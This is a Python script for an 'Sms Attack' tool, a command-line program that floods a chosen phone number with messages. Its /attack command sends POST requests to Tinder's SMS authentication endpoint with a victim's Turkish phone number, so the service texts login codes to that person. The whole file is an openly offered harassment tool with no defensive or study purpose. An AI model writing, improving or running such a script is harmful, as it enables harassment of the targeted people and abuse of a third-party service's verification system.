#!/usr/bin/env python
#libraries
import threading
import string
import base64
import urllib.request
import urllib.parse
import os
import time
import sys
import random
import webbrowser
import requests
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    request = requests.get("https://github.com/AnilKrkmz/Sms-Attack", timeout=3)
except (requests.ConnectionError, requests.Timeout) as exception:
    print("[!] No internet connection [!]")
    sys.exit()

import requests
from bs4 import BeautifulSoup
#color settings

yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
W = '\033[0m'
colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']

def clear():
    clr()
    banner()
    system()

def exitt():
    clr()
    print("Thanks for your time...")
    return 0

def docs():
    webbrowser.open('https://github.com/AnilKrkmz/Sms-Attack')
    clr()
    banner()
    system()

def system():
    console1 = input("\033[91m \n\n[*]Sms Attack: \033[0m " )

    def service_list():

        def messageT():
            url = "https://api.gotinder.com/v2/auth/sms/send"
            payloadT = {
    "auth_type": "sms",
    "locale": "tr",
    "phone_number": "{}{}".format(console3,console4)
}
            response = requests.request("POST", url, data = payloadT)
            print(response.text.encode('utf8')) 

        console2 = input("\033[93m \n\n[1]Tinder\033[95m\n\nChoose Service: \033[0m")
        if console2 == "1":
            console3 = input("\033[96m \n\nEnter the country code(Exp:+31): \033[0m")
            if console3 == "+90":
                console4 = input("\033[96m \n\nEnter the target number without + : \033[0m")
                messageT()
                if console4 == "/clear":
                    clear()
                elif console4 =="/exit":
                    exitt()
            elif console3 == "/clear":
                clear()
            elif console3 =="/exit":
                exitt()
            else:
                print("Unfortunately but country number you have written is not avaiable at the moment.")
                service_list()

        elif console2 == "/clear":
            clear()
        elif console2 =="/exit":
            exitt()
               
        else:
            print("\033[92mUnfortunately but service number you have written is not avaiable at the moment.\033[0m")
            service_list()                               

    def helpage():

        helpage_ = """
Commands 
/attack : it will attack the number.
/help   : you can learn the commands with this command like now you are doing. 
/clear  : restart the code and clear everything on console without banner.
/exit   : you can use this command for exit the code.
/docs   : open the documents about our tool.

"""
        print(helpage_)
        system()
        
    if console1 == "/help":
        helpage()
    elif console1 == "/attack":
        service_list()
    elif console1 =="/clear":
        clear()
    elif console1 =="/exit":
        exitt()
    elif console1 =="/docs":
         docs()
    else:
        print("Unfortunately there is no such command Type /help for learn the commands.")
        system()

def clr():

    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    clr()
    logo = """

\033[96m   ________  _____ ______   ________              \033[92m   ________  _________  _________  ________  ________  ___  ___ 
\033[96m  |\   ____\|\   _ \  _   \|\   ____\             \033[92m  |\   __  \|\___   ___|\___   ___|\   __  \|\   ____\|\  \|\  \   
\033[96m    \_/  \___||_|   |_||_|  |_| \___|\_           \033[92m  \ \  \|\  \|___ \  \_\|___ \  \_\ \  \|\  \ \  \___|\ \  \/  /|_   
\033[96m   \|____|\  \ \  \    \ \  \|____|\  \           \033[92m   \ \   __  \   \ \  \     \ \  \ \ \   __  \ \  \    \ \   ___  \  
\033[96m     ____\_\  \ \__\    \ \__\____\_\  \          \033[92m    \ \  \ \  \   \ \  \     \ \  \ \ \  \ \  \ \  \____\ \  \  \  \ 
\033[96m    |\_________\|__|     \|__|\_________\         \033[92m     \ \__\ \__\   \ \__\     \ \__\ \ \__\ \__\ \_______\ \__\  \__\ 
\033[96m    \|_________|             \|_________|         \033[92m      \|__|\|__|    \|__|      \|__|  \|__|\|__|\|_______|\|__| \|__|              
                                                                                                                                             
\033[92mType /help into the console to learn commands

                                         """
    print(logo)
    print("\n")

banner()
system()
